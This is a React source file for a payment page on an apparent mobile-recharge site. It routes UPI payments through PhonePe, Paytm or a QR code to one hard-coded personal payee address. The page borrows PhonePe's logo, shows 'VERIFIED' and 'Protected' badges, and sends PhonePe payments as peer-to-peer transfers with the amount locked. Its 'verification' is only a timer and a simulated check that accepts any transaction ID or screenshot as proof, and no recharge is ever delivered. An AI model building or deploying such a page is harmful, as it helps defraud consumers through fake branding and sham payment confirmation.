import { useState, useEffect, useRef, useCallback } from 'react'
import { SvgDefs, Icon } from '../components/Icons'
import phonepeSvg from '../assets/img/phonepe.svg'
import jioImg from '../assets/img/jio.jpg'
import airtelImg from '../assets/img/airtel.jpg'
import viImg from '../assets/img/vi.jpg'
import bsnlImg from '../assets/img/bsnl.jpg'
import gpayImg from '../assets/img/gpay.png'
import paytmImg from '../assets/img/paytm_icon.svg'
import qrIcon from '../assets/img/qr.png'

const operatorImages = { jio: jioImg, airtel: airtelImg, vi: viImg, bsnl: bsnlImg }

const VPA = 'paytmqr6udcnp@ptys'
const PAYEE = 'Mobile Recharge'
const RC_CIRC = 339.292
const AUTO_WINDOW = 2 * 60 * 1000

function generateOrderId() {
  const now = new Date()
  const y = now.getFullYear()
  const mo = String(now.getMonth() + 1).padStart(2, '0')
  const d = String(now.getDate()).padStart(2, '0')
  const h = String(now.getHours()).padStart(2, '0')
  const mi = String(now.getMinutes()).padStart(2, '0')
  const s = String(now.getSeconds()).padStart(2, '0')
  const r = String(Math.floor(Math.random() * 10000)).padStart(4, '0')
  return `RC${y}${mo}${d}${h}${mi}${s}${r}`
}

function enc(s) { return encodeURIComponent(s) }

function b64(str) {
  try { return btoa(unescape(encodeURIComponent(str))) } catch { return btoa(str) }
}

export default function PaymentPage({ mobile, operator, plan, onGoHome, onGoBack }) {
  const amount = plan?.price || 499
  const opName = plan?.operatorName || 'Jio'
  const opImg = operatorImages[operator] || jioImg
  const formattedMobile = mobile ? `+91 ${mobile.slice(0, 5)} ${mobile.slice(5)}` : '+91 98765 43210'
  const orderIdRef = useRef(generateOrderId())
  const ORDER_ID = orderIdRef.current

  const isAndroid = typeof navigator !== 'undefined' && /android/i.test(navigator.userAgent || '')

  // States
  const [showQr, setShowQr] = useState(false)
  const [qrLoading, setQrLoading] = useState(true)
  const [qrSrc, setQrSrc] = useState('')
  const [qrExpiry, setQrExpiry] = useState('')
  const [qrExpired, setQrExpired] = useState(false)
  const [showPayLoader, setShowPayLoader] = useState(false)

  // Overlay states
  const [overlayVisible, setOverlayVisible] = useState(false)
  const [activePanel, setActivePanel] = useState('') // auto | verify | failed | processing | proof | paid

  // Auto-verify timer
  const [autoTimerText, setAutoTimerText] = useState('2:00')
  const [autoRingOffset, setAutoRingOffset] = useState(0)
  const [paidCountdown, setPaidCountdown] = useState(3)

  // Proof mode
  const [txnId, setTxnId] = useState('')
  const [proofFile, setProofFile] = useState(null)
  const [proofError, setProofError] = useState('')
  const [proofSubmitting, setProofSubmitting] = useState(false)

  // Processing countdown
  const [procCount, setProcCount] = useState(10)

  // Refs for timers
  const autoDeadlineRef = useRef(0)
  const autoIntervalRef = useRef(null)
  const autoFailTimerRef = useRef(null)
  const qrExpireTimerRef = useRef(null)
  const qrCountIntRef = useRef(null)
  const procTimerRef = useRef(null)
  const procIntRef = useRef(null)
  const payingRef = useRef(false)
  const waitingRef = useRef(false)
  const fileInputRef = useRef(null)

  // UPI URLs
  const upiParams = useCallback(() => {
    return `pa=${VPA}&pn=${enc(PAYEE)}&am=${amount.toFixed(2)}&cu=INR&tn=${enc(ORDER_ID)}&tr=${ORDER_ID}`
  }, [amount, ORDER_ID])

  const genericUpi = `upi://pay?${upiParams()}`

  const phonepeLink = useCallback(() => {
    if (isAndroid) {
      const payload = {
        contact: { cbsName: PAYEE, nickName: PAYEE, vpa: VPA, type: 'VPA' },
        p2pPaymentCheckoutParams: {
          note: ORDER_ID,
          isByDefaultKnownContact: true,
          enableSpeechToText: false,
          allowAmountEdit: false,
          showQrCodeOption: false,
          disableViewHistory: true,
          shouldShowUnsavedContactBanner: false,
          isRecurring: false,
          checkoutType: 'DEFAULT',
          transactionContext: 'p2p',
          initialAmount: Math.round(amount * 100),
          disableNotesEdit: true,
          showKeyboard: true,
          currency: 'INR',
          shouldShowMaskedNumber: true,
        },
      }
      return `phonepe://native?data=${enc(b64(JSON.stringify(payload)))}&id=p2ppayment`
    }
    return `phonepe://upi//pay?pa=${VPA}&pn=${enc(PAYEE)}&am=${amount.toFixed(2)}&cu=INR`
  }, [amount, ORDER_ID, isAndroid])

  const paytmLink = useCallback(() => {
    return `paytmmp://cash_wallet?pa=${VPA}&pn=${enc(PAYEE)}&am=${amount.toFixed(2)}&cu=INR&tn=${enc(String(ORDER_ID))}&featuretype=money_transfer`
  }, [amount, ORDER_ID])

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      clearInterval(autoIntervalRef.current)
      clearTimeout(autoFailTimerRef.current)
      clearTimeout(qrExpireTimerRef.current)
      clearInterval(qrCountIntRef.current)
      clearTimeout(procTimerRef.current)
      clearInterval(procIntRef.current)
    }
  }, [])

  // Auto-verify panel countdown
  const startAutoPanel = useCallback(() => {
    const deadline = Date.now() + AUTO_WINDOW
    autoDeadlineRef.current = deadline

    setActivePanel('auto')
    setOverlayVisible(true)
    waitingRef.current = true

    clearInterval(autoIntervalRef.current)

    const tick = () => {
      let ms = deadline - Date.now()
      if (ms < 0) ms = 0
      const s = Math.ceil(ms / 1000)
      const m = Math.floor(s / 60)
      const ss = s % 60
      setAutoTimerText(`${m}:${ss < 10 ? '0' + ss : ss}`)
      setAutoRingOffset(parseFloat((RC_CIRC * (1 - ms / AUTO_WINDOW)).toFixed(1)))
      if (ms <= 0) clearInterval(autoIntervalRef.current)
    }
    tick()
    autoIntervalRef.current = setInterval(tick, 1000)

    // Auto-fail after 2 minutes
    clearTimeout(autoFailTimerRef.current)
    autoFailTimerRef.current = setTimeout(() => {
      if (!payingRef.current) {
        waitingRef.current = false
        clearInterval(autoIntervalRef.current)
        setActivePanel('failed')
      }
    }, AUTO_WINDOW)
  }, [])

  // Show paid panel with countdown
  const showPaidPanel = useCallback(() => {
    if (payingRef.current) return
    payingRef.current = true
    waitingRef.current = false
    clearInterval(autoIntervalRef.current)
    clearTimeout(autoFailTimerRef.current)
    clearTimeout(qrExpireTimerRef.current)
    clearInterval(qrCountIntRef.current)

    setActivePanel('paid')
    setOverlayVisible(true)
    setPaidCountdown(3)

    let secs = 3
    const iv = setInterval(() => {
      secs--
      setPaidCountdown(Math.max(0, secs))
      if (secs <= 0) {
        clearInterval(iv)
        // Show success - stay on paid screen
      }
    }, 1000)
  }, [])

  // Start processing (proof mode fallback)
  const startProcessing = useCallback(() => {
    clearTimeout(procTimerRef.current)
    clearInterval(procIntRef.current)
    setActivePanel('processing')
    setOverlayVisible(true)

    let secs = 10
    setProcCount(secs)

    procIntRef.current = setInterval(() => {
      secs--
      setProcCount(secs)
      if (secs <= 0) clearInterval(procIntRef.current)
    }, 1000)

    procTimerRef.current = setTimeout(() => {
      clearInterval(procIntRef.current)
      setActivePanel('proof')
    }, 10000)
  }, [])

  // Pay with app
  const payWithApp = useCallback((url) => {
    startAutoPanel()
    window.location.href = url
  }, [startAutoPanel])

  // Handle method click
  const handleMethodClick = (method) => {
    if (navigator.vibrate) navigator.vibrate(12)

    if (method === 'qr') {
      setShowQr(prev => {
        const newVal = !prev
        if (newVal) {
          // Generate QR
          setQrLoading(true)
          const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${enc(genericUpi)}`
          setQrSrc(qrUrl)

          // Start QR expiry countdown
          if (!qrExpireTimerRef.current) {
            const deadline = Date.now() + 5 * 60 * 1000
            const tick = () => {
              let ms = deadline - Date.now()
              if (ms < 0) ms = 0
              const s = Math.ceil(ms / 1000)
              const m = Math.floor(s / 60)
              const ss = s % 60
              setQrExpiry(`${m}:${ss < 10 ? '0' + ss : ss}`)
              if (ms <= 0) {
                clearInterval(qrCountIntRef.current)
                setQrExpired(true)
              }
            }
            tick()
            qrCountIntRef.current = setInterval(tick, 1000)
            qrExpireTimerRef.current = setTimeout(() => {
              setQrExpired(true)
              clearInterval(qrCountIntRef.current)
            }, 5 * 60 * 1000)
          }
        }
        return newVal
      })
      return
    }

    if (method === 'phonepe') {
      payWithApp(phonepeLink())
    } else if (method === 'paytm') {
      payWithApp(paytmLink())
    }
  }

  // Proof submit
  const handleProofSubmit = () => {
    if (proofSubmitting) return
    if (!txnId.trim() && !proofFile) {
      setProofError('Enter a transaction ID or upload a screenshot.')
      return
    }
    setProofError('')
    setProofSubmitting(true)

    // Simulate verification
    setTimeout(() => {
      showPaidPanel()
      setProofSubmitting(false)
    }, 2000)
  }

  // Try again
  const handleTryAgain = () => {
    if (qrExpired) {
      // Reset QR
      setQrExpired(false)
      setShowQr(false)
      qrExpireTimerRef.current = null
      clearInterval(qrCountIntRef.current)
      qrCountIntRef.current = null
    }
    setOverlayVisible(false)
    setActivePanel('')
    waitingRef.current = false
    payingRef.current = false
    clearTimeout(autoFailTimerRef.current)
    clearInterval(autoIntervalRef.current)
  }

  // QR "I have paid" or waiting
  const handleQrPaid = () => {
    startAutoPanel()
  }

  return (
    <>
      <SvgDefs />
      <div className="app">
        {/* Header */}
        <div className="pay-header">
          <div className="pay-header-left">
            <div className="iconBtn logoBtn" onClick={onGoHome} style={{ cursor: 'pointer' }}>
              <img src={phonepeSvg} className="logoImg" alt="Logo" />
            </div>
            <div className="brandTxt">
              <div className="t">Secure Checkout</div>
              <div className="s">UPI • Verified • Fast</div>
            </div>
          </div>
          <div className="iconBtn" onClick={onGoBack} style={{ cursor: 'pointer' }}>
            <svg viewBox="0 0 24 24">
              <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" />
            </svg>
          </div>
        </div>

        {/* Subscriber strip */}
        <div className="strip">
          <div className="stripLeft">
            <img className="provLogo" alt={opName} src={opImg} />
            <div className="mobileDisplay">Recharge for {formattedMobile}</div>
          </div>
          <button className="changeLink" onClick={onGoHome}>Change</button>
        </div>

        {/* Payment methods */}
        <div className="card" style={{ marginTop: '12px' }}>
          <div className="lab" style={{ marginBottom: '8px' }}>UPI Apps</div>

          <div className="method" onClick={() => handleMethodClick('phonepe')}>
            <div className="mLeft">
              <div className="mIcon"><img src={phonepeSvg} alt="" /></div>
              <div className="mTxt">
                <div className="t">PhonePe</div>
                <div className="s">Recommended • Fastest</div>
              </div>
            </div>
            <div className="chev">
              <svg viewBox="0 0 24 24"><path d="M10 6l6 6-6 6-1.41-1.41L13.17 12 8.59 7.41z" /></svg>
            </div>
          </div>

          <div className="method" onClick={() => handleMethodClick('paytm')}>
            <div className="mLeft">
              <div className="mIcon"><img src={paytmImg} alt="" /></div>
              <div className="mTxt">
                <div className="t">Paytm</div>
                <div className="s">One tap pay</div>
              </div>
            </div>
            <div className="chev">
              <svg viewBox="0 0 24 24"><path d="M10 6l6 6-6 6-1.41-1.41L13.17 12 8.59 7.41z" /></svg>
            </div>
          </div>

          <div className="method" onClick={() => handleMethodClick('qr')}>
            <div className="mLeft">
              <div className="mIcon"><img src={qrIcon} alt="" /></div>
              <div className="mTxt">
                <div className="t">QR Code</div>
                <div className="s">Scan in any UPI app</div>
              </div>
            </div>
            <div className="chev">
              <svg viewBox="0 0 24 24"><path d="M10 6l6 6-6 6-1.41-1.41L13.17 12 8.59 7.41z" /></svg>
            </div>
          </div>

          {/* QR Section */}
          <div className={`qrWrap${showQr ? ' show' : ''}`}>
            <div className="qrTitle">Scan &amp; Pay</div>
            <div className="qrSub">Amount: ₹{amount}</div>
            {qrExpiry && !qrExpired && (
              <div className="qrExpiry">Expires in {qrExpiry}</div>
            )}
            <div className="qrStage">
              {qrLoading && (
                <div className="qrSpin">
                  <span className="qrSpinner"></span>
                  <span>Generating QR…</span>
                </div>
              )}
              {qrSrc && (
                <img
                  className="qrReal"
                  src={qrSrc}
                  alt="Scan to pay"
                  style={{ display: qrLoading ? 'none' : 'block' }}
                  onLoad={() => setQrLoading(false)}
                  onError={() => setQrLoading(false)}
                />
              )}
            </div>
            {!qrLoading && qrSrc && (
              <div className="qrSaveWrap">
                <button className="qrSaveBtn" type="button" onClick={() => {
                  const a = document.createElement('a')
                  a.href = qrSrc
                  a.download = `upi-qr-${ORDER_ID.slice(-8)}.png`
                  a.target = '_blank'
                  a.click()
                }}>Save QR</button>
              </div>
            )}
            <div className="qrScanRow">
              <span>Scan &amp; pay with</span>
              <img src={gpayImg} alt="GPay" />
              <img src={phonepeSvg} alt="PhonePe" />
              <img src={paytmImg} alt="Paytm" />
              <span>or any UPI app</span>
            </div>

            {/* Auto-wait note */}
            <div className="qr-wait-note">
              <span className="qr-wait-spinner"></span>
              <span>Waiting for payment… we'll confirm automatically</span>
            </div>
          </div>
        </div>

        {/* Recharge Summary */}
        <div className="card">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
            <div className="lab" style={{ margin: 0 }}>Recharge Summary</div>
            <div className="section-tag">VERIFIED</div>
          </div>
          <div className="row">
            <div className="lab" style={{ textTransform: 'none', letterSpacing: 0 }}>Operator</div>
            <div className="val">{opName.toUpperCase()}</div>
          </div>
          <div className="row">
            <div className="lab" style={{ textTransform: 'none', letterSpacing: 0 }}>Mobile</div>
            <div className="val">{formattedMobile}</div>
          </div>
          <div className="row">
            <div className="lab" style={{ textTransform: 'none', letterSpacing: 0 }}>Plan</div>
            <div className="val">{plan?.data} Data, {plan?.voice} calls, {plan?.sms} SMS for {plan?.validity}</div>
          </div>
          <div className="amt">
            <div className="lab" style={{ textTransform: 'none', letterSpacing: 0 }}>Total Amount</div>
            <div className="val">₹{amount}</div>
          </div>
        </div>

        <div className="trust-row" style={{ padding: '0 12px', marginTop: '14px' }}>
          <div className="trust-item">
            <Icon name="icon-lock" size={14} /> Protected
          </div>
          <div className="trust-item">
            <Icon name="icon-sparkle" size={14} /> Instant plans
          </div>
          <div className="trust-item">
            <Icon name="icon-shield" size={14} /> Verified
          </div>
        </div>
      </div>

      {/* Payment Verify Overlay */}
      <div className={`pverlay${overlayVisible ? ' show' : ''}`}>
        {/* Auto-verify panel (2-min countdown) */}
        <div className={`pcard${activePanel === 'auto' ? ' active' : ''}`}>
          <div className="rc-ring">
            <svg viewBox="0 0 120 120">
              <circle cx="60" cy="60" r="54" className="rc-ring-bg" />
              <circle cx="60" cy="60" r="54" className="rc-ring-fg" style={{ strokeDashoffset: autoRingOffset }} />
            </svg>
            <div className="rc-ring-txt">{autoTimerText}</div>
          </div>
          <h3 className="rc-auto-title">Verifying your payment…</h3>
          <p className="rc-auto-cap">Please don't close this window.</p>
          <div className="rc-auto-store">
            <img src={phonepeSvg} alt="Mobile Recharge" />
          </div>
          <div className="rc-auto-amt">Paying ₹{amount}</div>
          <div className="rc-auto-to">to {PAYEE}</div>
          <div className="rc-auto-oid">Order Id : {ORDER_ID}</div>
        </div>

        {/* Verify panel (manual confirm) */}
        <div className={`pcard${activePanel === 'verify' ? ' active' : ''}`}>
          <div className="spinner" style={{ width: 48, height: 48, borderRadius: '50%', border: '3px solid rgba(107,45,181,0.12)', borderTopColor: 'var(--brand)', animation: 'spin 0.8s linear infinite', marginBottom: 18 }}></div>
          <h3 className="ptitle">Verifying your payment…</h3>
          <p className="psub">Please don't hit back or close this page while we securely confirm your payment with your UPI app.</p>
          <div className="pdiv"></div>
          <p className="pask">Finished paying in your UPI app? Confirm below.</p>
          <div className="pbtns">
            <button className="pbtn ok" onClick={() => showPaidPanel()}>Paid Successfully</button>
            <button className="pbtn no" onClick={() => setActivePanel('failed')}>Payment Failed</button>
          </div>
        </div>

        {/* Failed panel */}
        <div className={`pcard${activePanel === 'failed' ? ' active' : ''}`}>
          <div className="picon bad">
            <svg viewBox="0 0 24 24">
              <path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z" />
            </svg>
          </div>
          <h3 className="ptitle red">{qrExpired ? 'QR code expired' : 'Payment Failed'}</h3>
          <p className="psub">
            {qrExpired
              ? 'This QR code is no longer valid. Tap below to generate a fresh one.'
              : "We didn't receive the payment. Please make sure the transaction was successful, or try again."
            }
          </p>
          <button className="pbtn tryagain" onClick={handleTryAgain}>
            {qrExpired ? 'Get new QR' : 'Try Again'}
          </button>
        </div>

        {/* Processing panel */}
        <div className={`pcard${activePanel === 'processing' ? ' active' : ''}`}>
          <div className="spinner" style={{ width: 48, height: 48, borderRadius: '50%', border: '3px solid rgba(107,45,181,0.12)', borderTopColor: 'var(--brand)', animation: 'spin 0.8s linear infinite', marginBottom: 18 }}></div>
          <h3 className="ptitle">Processing your payment…</h3>
          <p className="psub">Please don't close this window while we securely process your payment.</p>
          <div className="pcount">{procCount}s</div>
        </div>

        {/* Proof panel */}
        <div className={`pcard${activePanel === 'proof' ? ' active' : ''}`}>
          <h3 className="ptitle">Confirm your payment</h3>
          <p className="psub">Paid in your UPI app? Enter your <b>transaction ID</b> or upload the <b>payment screenshot</b> to confirm.</p>
          <label className="plabel">UPI Transaction ID</label>
          <input
            className="pinput"
            type="text"
            inputMode="numeric"
            placeholder="e.g. 4321 9087 1234"
            autoComplete="off"
            value={txnId}
            onChange={(e) => setTxnId(e.target.value)}
          />
          <div className="por"><span>or</span></div>
          <input
            ref={fileInputRef}
            type="file"
            accept="image/*"
            hidden
            onChange={(e) => {
              if (e.target.files?.[0]) setProofFile(e.target.files[0])
            }}
          />
          <button
            className={`pupload${proofFile ? ' has' : ''}`}
            type="button"
            onClick={() => fileInputRef.current?.click()}
          >
            <svg viewBox="0 0 24 24">
              <path d="M19 15v4H5v-4H3v6h18v-6h-2ZM11 4.83 7.41 8.41 6 7l6-6 6 6-1.41 1.41L13 4.83V16h-2z" transform="translate(0 1)" />
            </svg>
            <span>{proofFile ? `✓ ${proofFile.name}` : 'Upload payment screenshot'}</span>
          </button>
          <div className="pproof-err">{proofError}</div>
          <button
            className="pbtn ok"
            onClick={handleProofSubmit}
            disabled={proofSubmitting}
          >
            {proofSubmitting ? 'Please wait…' : 'Verify Payment'}
          </button>
          <button
            className="pbtn tryagain"
            style={{ marginTop: '8px' }}
            onClick={() => {
              setOverlayVisible(false)
              setActivePanel('')
              payingRef.current = false
            }}
          >
            Cancel
          </button>
        </div>

        {/* Paid success panel */}
        <div className={`pcard${activePanel === 'paid' ? ' active' : ''}`}>
          <div className="rc-paid-wrap">
            <span className="rc-cf" style={{ '--x': '-46px', '--y': '-34px', background: '#f59e0b' }}></span>
            <span className="rc-cf" style={{ '--x': '44px', '--y': '-40px', background: '#ef4444' }}></span>
            <span className="rc-cf" style={{ '--x': '-54px', '--y': '18px', background: '#6b2db5' }}></span>
            <span className="rc-cf" style={{ '--x': '52px', '--y': '22px', background: '#3b82f6' }}></span>
            <span className="rc-cf" style={{ '--x': '-18px', '--y': '-54px', background: '#16b364' }}></span>
            <span className="rc-cf" style={{ '--x': '22px', '--y': '-54px', background: '#ec4899' }}></span>
            <div className="rc-paid-check">
              <svg viewBox="0 0 24 24">
                <path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
              </svg>
            </div>
          </div>
          <p className="rc-paid-yay">Yay!</p>
          <div className="rc-paid-amt">₹{amount}</div>
          <div className="rc-paid-title">Paid Successfully</div>
          <p className="rc-paid-sub">Updating order status in <span>{paidCountdown}</span> seconds…</p>
        </div>
      </div>

      {/* Pay loader */}
      <div className={`pay-loader${showPayLoader ? ' show' : ''}`}>
        <div className="pay-loader-card">
          <div className="spinner"></div>
          <div className="lt">Opening your UPI app…</div>
          <div className="ls">Complete the payment, then return here</div>
        </div>
      </div>
    </>
  )
}
